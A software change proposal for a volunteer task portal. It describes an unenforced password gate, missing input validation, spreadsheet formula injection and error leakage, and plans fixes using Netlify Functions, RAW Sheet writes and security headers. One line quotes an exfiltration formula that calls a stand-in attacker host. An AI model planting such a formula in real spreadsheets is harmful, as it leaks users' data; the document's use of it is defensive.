## Why

The portal's API is unprotected. `public/app.js` already prompts for a portal
password and sends it as `X-Portal-Password` on every request, but the Express
handlers in `api/create-task.js` never read that header — the gate is decoration.
Anyone who can reach the deployment can create Drive folders, write rows into the
operations Sheet, and broadcast to the volunteer Telegram chat.

Three more gaps follow from the same handlers:

- **No input validation.** `taskName` is only checked for presence. Any JSON value
  of any size reaches the Sheet row and the Drive folder name, and `formUrl` is
  encoded into a QR code without checking that it is even an HTTP URL.
- **Rows are written as user-entered values,** so a task name beginning with `=` is
  stored as a live spreadsheet formula. `=IMPORTDATA("https://evil.tld/?"&A1)` in a
  submission turns the operations Sheet into an exfiltration channel.
- **Internal errors leak.** The catch-all returns `error.message` straight to the
  caller, which surfaces Google API internals to the browser.

Meanwhile the deployment story is unresolved: `DEPLOYMENT.md` points at Render or
Railway for the long-running Express server, while the `lib/*.mjs` helpers are
written against the Fetch API (`Request`, `Response`, `req.headers.get`) rather than
Express. Serverless suits this workload — two request-scoped handlers and a static
folder, with no state to keep between requests — and Netlify serves `public/`
directly, which also gives one place to declare security headers for the whole site.

These ship together because the auth and validation helpers cannot be mounted in
Express as written; picking the runtime and closing the auth hole are one decision.

## What Changes

- Add server-side shared-password authentication in front of both endpoints,
  failing closed when the password is unset or shorter than 12 characters.
- Reimplement `POST /api/create-task` and `GET /api/tasks` as Netlify Functions at
  the same URLs, wiring in the `lib/` helpers.
- Enforce type, length, URL-scheme, and date-format validation on every field, and
  use only the validated values downstream.
- Write Sheet rows as `RAW` values so no submission can become a live formula.
- Return generic messages to callers and log real errors server-side; stop
  returning the raw Drive error string in the success response.
- Report an upstream Sheets failure as `502` rather than `500`, and stop answering
  an unreadable Sheet with an empty task list that looks like "no tasks yet".
- Replace `node-telegram-bot-api` with a direct `fetch` call under a timeout. The
  package pulls in the deprecated `request` library and two critical advisories,
  for one `sendMessage` call. Messages move to HTML parse mode with every
  user-supplied value escaped, and link previews are disabled.
- Declare `no-store` on `/api/*` and a strict CSP plus framing, sniffing, referrer,
  permissions, and HSTS headers for the whole site in `netlify.toml`.
- Retire the Express server (`server.js`, `api/create-task.js`) and the stale
  root-level `app.js` / `index.html` duplicates that nothing serves.
- Track `lib/*.mjs` in git, and tighten `.gitignore` so the `*.json` secret rule
  stops excluding `package-lock.json`.

## Capabilities

### New Capabilities

- `portal-access`: shared-password authentication for the task API, plus the
  caching and error-disclosure rules that apply to authenticated responses.

### Modified Capabilities

- `task-intake`: adds request validation and method handling; an unrecordable task
  now answers `502`, and unexpected errors no longer disclose internal messages.
- `task-registry`: rows are written as raw values, and an unreachable datastore
  fails loudly instead of returning an empty task list.
- `telegram-notifications`: HTML parse mode with escaped values, previews disabled,
  a dispatch timeout, and logs that cannot echo the bot token.
- `portal-ui`: the page is served under a strict Content-Security-Policy and a set
  of browser hardening headers.

## Impact

- **Added**: `netlify.toml`, `netlify/functions/create-task.mjs`,
  `netlify/functions/tasks.mjs`, `lib/auth.mjs`, `lib/google.mjs`, `lib/http.mjs`,
  `lib/telegram.mjs`, `lib/validate.mjs`.
- **Removed**: `server.js`, `api/create-task.js`, root `app.js`, root `index.html`.
- **Changed**: `package.json` (drop `express`, `cors`, and `node-telegram-bot-api`;
  `dotenv` becomes a dev dependency; `googleapis` upgraded; `start`/`dev` scripts
  replaced by `netlify dev`), `.gitignore`, `.env.example`, `DEPLOYMENT.md`,
  `README.md`.
- **Configuration**: `PORTAL_PASSWORD` becomes a required environment variable —
  the deployment refuses requests until it is set to at least 12 characters.
- **Unaffected**: `public/index.html` and `public/app.js` need no change; they
  already speak this protocol and load no third-party resources, which is what
  makes the strict CSP possible.
